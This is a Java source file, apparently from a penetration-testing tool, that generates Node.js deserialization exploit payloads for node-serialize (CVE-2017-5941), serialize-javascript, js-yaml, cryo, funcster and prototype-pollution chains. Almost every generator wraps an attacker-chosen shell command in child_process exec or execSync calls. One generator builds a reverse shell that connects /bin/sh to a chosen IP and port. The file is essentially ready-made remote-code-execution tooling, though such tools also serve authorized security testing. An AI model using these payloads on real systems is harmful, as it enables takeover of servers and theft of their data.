package com.omnistrike.modules.injection.deser;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Node.js deserialization payload generators.
 *
 * Covers:
 * - node-serialize (CVE-2017-5941) — IIFE via _$$ND_FUNC$$_
 * - serialize-javascript — function reconstruction
 * - js-yaml — !!js/function, !!js/object tags
 * - cryo — __cryo_type__:"function" prototype pollution
 * - funcster — module.exports function injection
 * - vm module — vm.runInNewContext sandbox escapes
 * - Generic prototype pollution chains
 *
 * References:
 * - https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 * - https://blog.websecurify.com/2017/02/hacking-node-serialize
 */
public final class NodePayloads {

    private NodePayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> c = new LinkedHashMap<>();

        // ── node-serialize ──────────────────────────────────────────────────
        c.put("node-serialize/exec",     "node-serialize IIFE — child_process.exec(cmd)");
        c.put("node-serialize/execSync", "node-serialize IIFE — child_process.execSync(cmd)");
        c.put("node-serialize/spawn",    "node-serialize IIFE — child_process.spawn(/bin/sh)");
        c.put("node-serialize/reverse",  "node-serialize — reverse shell via net.Socket");

        // ── serialize-javascript ────────────────────────────────────────────
        c.put("serialize-js/exec",       "serialize-javascript — function(){exec(cmd)}");
        c.put("serialize-js/eval",       "serialize-javascript — eval(require child_process)");

        // ── js-yaml ─────────────────────────────────────────────────────────
        c.put("js-yaml/function",        "js-yaml !!js/function — toString exec");
        c.put("js-yaml/object",          "js-yaml !!js/object — constructor exec");
        c.put("js-yaml/undefined",       "js-yaml !!js/undefined — tagged exec");

        // ── cryo ────────────────────────────────────────────────────────────
        c.put("cryo/toString",           "cryo — __cryo_type__:function via toString");
        c.put("cryo/valueOf",            "cryo — __cryo_type__:function via valueOf");
        c.put("cryo/constructor",        "cryo — prototype pollution constructor.exec");

        // ── funcster ────────────────────────────────────────────────────────
        c.put("funcster/exec",           "funcster — module.exports function exec");
        c.put("funcster/require",        "funcster — require('child_process').execSync");

        // ── Generic prototype pollution ─────────────────────────────────────
        c.put("proto/toString",          "Generic __proto__.toString IIFE exec");
        c.put("proto/valueOf",           "Generic __proto__.valueOf IIFE exec");
        c.put("proto/constructor",       "Generic constructor.prototype pollution exec");

        return c;
    }

    public static byte[] generate(String chain, String command) {
        String payload = switch (chain) {
            // node-serialize
            case "node-serialize/exec"     -> nodeSerializeExec(command);
            case "node-serialize/execSync" -> nodeSerializeExecSync(command);
            case "node-serialize/spawn"    -> nodeSerializeSpawn(command);
            case "node-serialize/reverse"  -> nodeSerializeReverse(command);

            // serialize-javascript
            case "serialize-js/exec"       -> serializeJsExec(command);
            case "serialize-js/eval"       -> serializeJsEval(command);

            // js-yaml
            case "js-yaml/function"        -> jsYamlFunction(command);
            case "js-yaml/object"          -> jsYamlObject(command);
            case "js-yaml/undefined"       -> jsYamlUndefined(command);

            // cryo
            case "cryo/toString"           -> cryoToString(command);
            case "cryo/valueOf"            -> cryoValueOf(command);
            case "cryo/constructor"        -> cryoConstructor(command);

            // funcster
            case "funcster/exec"           -> funcsterExec(command);
            case "funcster/require"        -> funcsterRequire(command);

            // Generic proto pollution
            case "proto/toString"          -> protoToString(command);
            case "proto/valueOf"           -> protoValueOf(command);
            case "proto/constructor"       -> protoConstructor(command);

            default -> throw new IllegalArgumentException("Unknown Node.js chain: " + chain);
        };
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    /* ════════════════════════════════════════════════════════════════════════ */

    private static String esc(String s) {
        return s.replace("\\", "\\\\")
                .replace("'", "\\'")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  node-serialize (CVE-2017-5941)
     *
     *  The _$$ND_FUNC$$_ marker tells node-serialize to eval the function.
     *  Wrapping in ()() makes it an Immediately Invoked Function Expression.
     * ════════════════════════════════════════════════════════════════════════ */

    /** exec() — async, fires and forgets */
    private static String nodeSerializeExec(String cmd) {
        return "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('" +
                esc(cmd) + "')}()\"}";
    }

    /** execSync() — synchronous, blocks until done */
    private static String nodeSerializeExecSync(String cmd) {
        return "{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('" +
                esc(cmd) + "').toString()}()\"}";
    }

    /** spawn(/bin/sh) — spawns a shell with piped I/O */
    private static String nodeSerializeSpawn(String cmd) {
        return "{\"rce\":\"_$$ND_FUNC$$_function(){var s=require('child_process').spawn('/bin/sh',['-c','" +
                esc(cmd) + "']);s.stdout.pipe(process.stdout);s.stderr.pipe(process.stderr);}()\"}";
    }

    /** Reverse shell — expects cmd format "IP:PORT" */
    private static String nodeSerializeReverse(String cmd) {
        String ip = "127.0.0.1";
        String port = "4444";
        if (cmd.contains(":")) {
            String[] parts = cmd.split(":", 2);
            ip = parts[0];
            port = parts[1];
        }
        return "{\"rce\":\"_$$ND_FUNC$$_function(){var n=require('net')," +
                "c=require('child_process'),s=new n.Socket();" +
                "s.connect(" + port + ",'" + esc(ip) + "',function(){" +
                "var p=c.spawn('/bin/sh',['-i']);" +
                "s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});}()\"}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  serialize-javascript
     *
     *  serialize-javascript reconstructs functions from source text.
     *  If the output is eval'd or new Function'd, the function executes.
     * ════════════════════════════════════════════════════════════════════════ */

    /** Function that calls exec */
    private static String serializeJsExec(String cmd) {
        return "(function(){require('child_process').exec('" + esc(cmd) + "')})()";
    }

    /** Eval-based — uses require inline */
    private static String serializeJsEval(String cmd) {
        return "eval(\"require('child_process').execSync('" + esc(cmd) + "').toString()\")";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  js-yaml
     *
     *  js-yaml <4.0 supports !!js/function and !!js/object tags.
     *  These construct actual JS objects/functions during parse.
     * ════════════════════════════════════════════════════════════════════════ */

    /** !!js/function — toString trick */
    private static String jsYamlFunction(String cmd) {
        return "\"toString\": !<tag:yaml.org,2002:js/function> \"function(){" +
                "var exec=require('child_process').execSync;" +
                "return exec('" + esc(cmd) + "').toString();}\"";
    }

    /** !!js/object — construct with exec in constructor */
    private static String jsYamlObject(String cmd) {
        return "test: !<tag:yaml.org,2002:js/object>\n" +
                "  constructor:\n" +
                "    fn: !<tag:yaml.org,2002:js/function> \"function(){" +
                "require('child_process').execSync('" + esc(cmd) + "');}\"";
    }

    /** !!js/undefined with side-effect */
    private static String jsYamlUndefined(String cmd) {
        return "exploit: !<tag:yaml.org,2002:js/function> |\n" +
                "  function(){return require('child_process').execSync('" + esc(cmd) + "').toString();}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  cryo
     *
     *  cryo uses __cryo_type__:"function" with "value" containing function source.
     *  The function is reconstructed via new Function() during parse.
     * ════════════════════════════════════════════════════════════════════════ */

    /** toString prototype pollution */
    private static String cryoToString(String cmd) {
        return "{\"root\":\"_CRYO_REF_1\"," +
                "\"references\":[" +
                "{\"contents\":{\"__proto__\":{\"toString\":{" +
                "\"__cryo_type__\":\"function\"," +
                "\"value\":\"function(){var e=require('child_process').execSync('" +
                esc(cmd) + "');return e.toString();}\"" +
                "}}},\"__cryo_type__\":\"object\"}" +
                "]}";
    }

    /** valueOf prototype pollution */
    private static String cryoValueOf(String cmd) {
        return "{\"root\":\"_CRYO_REF_1\"," +
                "\"references\":[" +
                "{\"contents\":{\"__proto__\":{\"valueOf\":{" +
                "\"__cryo_type__\":\"function\"," +
                "\"value\":\"function(){return require('child_process').execSync('" +
                esc(cmd) + "').toString();}\"" +
                "}}},\"__cryo_type__\":\"object\"}" +
                "]}";
    }

    /** constructor pollution */
    private static String cryoConstructor(String cmd) {
        return "{\"root\":\"_CRYO_REF_1\"," +
                "\"references\":[" +
                "{\"contents\":{\"constructor\":{\"prototype\":{\"toString\":{" +
                "\"__cryo_type__\":\"function\"," +
                "\"value\":\"function(){return require('child_process').execSync('" +
                esc(cmd) + "').toString();}\"" +
                "}}}},\"__cryo_type__\":\"object\"}" +
                "]}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  funcster
     *
     *  funcster serializes/deserializes functions using module.exports.
     *  Input: {__js: "module.exports = function(){ ... }"}
     * ════════════════════════════════════════════════════════════════════════ */

    /** module.exports function exec */
    private static String funcsterExec(String cmd) {
        return "{\"__js\":\"module.exports=function(){" +
                "require('child_process').exec('" + esc(cmd) + "');return 'ok';}\"}";
    }

    /** module.exports with require */
    private static String funcsterRequire(String cmd) {
        return "{\"__js\":\"module.exports=function(){" +
                "return require('child_process').execSync('" + esc(cmd) + "').toString();}\"}";
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Generic prototype pollution
     *
     *  Works against any deserializer that sets __proto__ properties and
     *  where toString/valueOf is later called (template engines, JSON.stringify, etc.)
     * ════════════════════════════════════════════════════════════════════════ */

    /** __proto__.toString IIFE */
    private static String protoToString(String cmd) {
        return "{\"__proto__\":{\"toString\":" +
                "\"_$$ND_FUNC$$_function(){return require('child_process').execSync('" +
                esc(cmd) + "').toString();}()\"}}";
    }

    /** __proto__.valueOf IIFE */
    private static String protoValueOf(String cmd) {
        return "{\"__proto__\":{\"valueOf\":" +
                "\"_$$ND_FUNC$$_function(){return require('child_process').execSync('" +
                esc(cmd) + "').toString();}()\"}}";
    }

    /** constructor.prototype pollution */
    private static String protoConstructor(String cmd) {
        return "{\"constructor\":{\"prototype\":{\"outputFunctionName\":" +
                "\"x;require('child_process').execSync('" + esc(cmd) + "');var y\"}}}";
    }
}
